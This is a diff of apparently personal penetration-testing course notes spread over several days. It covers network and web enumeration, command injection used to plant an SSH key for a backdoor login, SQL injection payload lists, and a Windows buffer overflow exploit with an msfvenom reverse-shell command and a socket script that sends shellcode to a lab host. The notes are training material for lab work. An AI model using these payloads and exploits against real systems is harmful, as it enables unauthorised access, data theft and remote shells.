@@ -55,6 +55,7 @@ DAY1
               --script"discovery" - runs all discovery type scripts
               
             for i in {1..254}; do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done 
+            for i in {1..254} ;do (ping -c 1 192.168.1.$i 2>/dev/null | grep "bytes from" &) ;done
             
             nmap -Pn -T4 xxx.xxx.xxx.xxx -p- --min-rate=8000
             
@@ -66,8 +67,8 @@ DAY1
 DAY2
             
     HTTP
-        - request
-        - reply
+        - request (client)
+        - reply (server)
       Methods
         - GET *** requesting/retrieving data
         - HEAD 
@@ -75,7 +76,7 @@ DAY2
       ## GET / HTTP/1.1
         - GET *** HTTP method to request/retrieve
         - / *** www.google.com/
-        - HTTP/1.1 *** HTTP version being used
+        - HTTP/1.1 = HTTP version being used
       Status Codes
         - 1xx = Informational response
         - 2xx = successful
@@ -84,16 +85,18 @@ DAY2
         - 5xx = Server Error
       Developer Console
         1. Open a web page in firefox
-        2. Right click -> view page source
+        2. Right click -> view page source **** gunny comment on non visible text; opacity
         3. press f12
             document.location; document.cookie; function(); can run existing functions on the website
+            <script> function myFunction() { document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
     WGET & CURL
         WGET
             wget -r -l2 -P /tmp ftp://ftpserver/
              ^ -r recursive, -l2 2 layers deep, -P /tmp saves to tmp directory
-                - Per Jake, do not rely on WGET as a crutch
+               Wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
+               wget --load-cookies cookies.txt -p http://....com/interesting/article.php
        CURL
-            curl -o imstuff.html hhtp://www.reddit.com
+            curl -o imstuff.html hhtp://www.imstuff.com
             curl 'website' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png *** Send Cookie settings with data, then pipe results
     JavaScript
        js interactive - <script> function myFunction() { document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
@@ -106,10 +109,13 @@ DAY2
                  Web Enumeration Steps
                          The goal of web enumeration is to find out the existing webpages and webdirectories
                                     - Host Discovery (ping sweep)
-                                    - Host Enumeration (port scan) nmap -Pn -T5 x.x.x.x -p-
-                                    - Service enumeration (-sV|banner.nse) nmap -Pn -T5 x.x.x.x -sV -p <ports> nmap -Pn -T5 x.x.x.x --script=banner.nse -p <ports>
-                                    - Web Enumeration nmap -Pn -T5 -sT -p 80 --script http-enum.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse x.x.x.x
-                                      ^ robots.txt finds webpages you can navigate to outside of the normal means
+                                    - Host Enumeration (port scan) - Pn -T5 x.x.x.x -p-
+                                    - Service enumeration (-sV|banner.nse) nmap -Pn -T5 x.x.x.x -sV -p <ports> 
+                                    - nmap -Pn -T5 x.x.x.x --script=banner.nse -p <ports>
+                                    - Web Enumeration nmap -v -Pn -T5 -sT -p 80 --script http-enum.nse x.x.x.x 
+                                    - nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse x.x.x.x 
+                                    - nmap -v -Pn -T5 -sT -p 80 --script http-robots.txt.nse x.x.x.x
+                                                                       ^ robots.txt finds webpages you can navigate to outside of the normal means
                                   So what actually is the robots.txt file?
                                    Robots.txt tells webcrawlers what can and cannot be indexed  Ex. http://foxnews.com/robots.txt
    
@@ -172,25 +178,26 @@ DAY2
     
     SSH Keys 
        ssh student@x.x.x.x password
-   Generate keys on whichever host you plan on logging in from (lin-ops)
+-- Generate keys on whichever host you plan on logging in from (lin-ops)
        - ssh-keygen -t rsa -b 4096
         - public key is found in /home/student/.ssh/id_rsa.pub (cat)
-   Determine usr's home directory
+--  Determine usr's home directory
      ;cat /etc/passwd
        - www-date:x:33:33:www-data:/var/www:/bin/bash
        - user: www-data
        - home dir: /var/www
        - login shell: /bin/bash
-   Determine if .ssh/ directory exists in the users home directory; if not, create it
+-- Determine if .ssh/ directory exists in the users home directory; if not, create it
        - ;mkdir /var/www/.ssh
-   Validate the .ssh/ directory has been created
+-- Validate the .ssh/ directory has been created
        - ;ls -la /var/www
-   Inject our key into the authorized_keys file (create directory if needed)
+-- Inject our key into the authorized_keys file (create directory if needed)
        - echo  'ssh-rsa XcsEHSnd...== student@lin-ops' > /var/www/.ssh/authorized_keys
-   Validate the public is inside the authorized_keys file
+-- Validate the public is inside the authorized_keys file
        - ;cat /var/www/.ssh/authorized_keys
-   Login from the workstation you generated the key from
+-- Login from the workstation you generated the key from
        - ssh www-data@x.x.x.x
+       - ssh -i .ssh/id_rsa www-data@x.x.x.x
     
     
 DAY3
@@ -218,12 +225,19 @@ POST Method
          - Dumping/extracting information via golden statement 
               statement in question - SELECT table_schema,table_name,column_name FROM information_schema.columns
                ex. Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns; # (found schema session, with table user, with columns name, pass)
+               ex. http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column.name,table_name from information_schema.columns
          - Extracting desired information
                ex. Audi' UNION select id,2,name,pass,5 from session.user; #
 
     user: 'or 1='1
     pass: 'or 1='1
     badguy.com/login.php?user='or1='1&pass='or1='1
+
+         <value>' or 1='1
+         <value>' or 1='1;
+         <value>' or 1='1; #
+         <value>' or 1='1;==
+         <value>' or 1='1; --
 
 GET Method
          - Determine vunerable webpage via truth statement
@@ -235,7 +249,10 @@ GET Method
             
          - Dumping/extracting information via golden statement
          
-         
+<value> or 1=1
+<value> or 1=1;
+<value> or 1=1; #
+<value> or 1=1; --
          
 DAY4
       REVERSE ENGINEERING 
@@ -260,10 +277,10 @@ DAY4
             - find plain text ascii and unicode:: strings -n <number> <filename> OR IDA view > subviews > strings
             - CFF explorer
             - GNU debugger:: gdb <filename>
-            behavioral
+            
+          dynamic/behavioral
                - run file, fuck with it and see what it does
-               dynamic
-                  - tbd
+
                   disassembly
                      - IDA / Ghidra
                      - file > importfile > file_to_import
@@ -315,9 +332,9 @@ DAY5
                 - gdb-peda$ run <<< $(python /home/student/Downloadsfuncballs.py)
                   - Find EIP 
                            ESP: 0xffffd480 ("Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
-                           EIP: 0x31634130 ('0Ac1')
+                           EIP: 0x31634130 ('0Ac1') ****< Hex number = 'buf'
                            EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
-          **          - paste EIP into https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+          **        - paste EIP into https://wiremask.eu/tools/buffer-overflow-pattern-generator/
                         - this will show you the offset, line 3 places 4 bits (length of EIP) at the end of the offset for verification
                                   1 buf = "A" * 62                                                                                                                                                                                                 
                                   2 
@@ -439,6 +456,40 @@ DAY5
                - double check programming (variables, \xf7, etc)
                - pick another jump esp (from info proc map >> find command)
                - take the L loser, do it all over again 
+               
+      WINDOWS EXPLOIT DEVELOPMENT
+
+          view -> log -> go to bottom white box that says 'call tree' -> type `!mona jmp -r ESP -m "essfunc.dll"` 
+              sfor funny endian change number
+              
+              ssh student@localhost -L 50000:10.50.40.227:22 -NT
+              ssh student@localhost -p 50000 -L 50001:192.168.28.105:2222 -NT
+              ssh comrade@localhost -p 50001 -D 9050 -NT
+              
+              msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.27.247 LPORT=8888 -b '\x00' -f python
+              
+              
+              
+             #!/usr/bin/python
+ 
+             import socket
+
+             buf = "TRUN /.:/"
+             buf += "A" * 2003
+             buf += "\xad\x12\x50\x62"
+             buf += "\x90" * 20
+             buf += b"\xbe\xec\xba\x2e\xce\xda\xcb\xd9\x74\x24\xf4\x5a\x29"
+             buf += b"\xc9\xb1\x59\x31\x72\x14\x83\xea\xfc\x03\x72\x10\x0e"
+             .....
+             .....
+             .....
+             buf += b"\x01\x1b\x23\xd5"
+             s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+             s.connect(("192.168.150.245", 9999))
+             print s.recv(1024)
+             s.send(buf)
+             s.close()
+               
       
 DAY ???
          POST EXPLOITATION
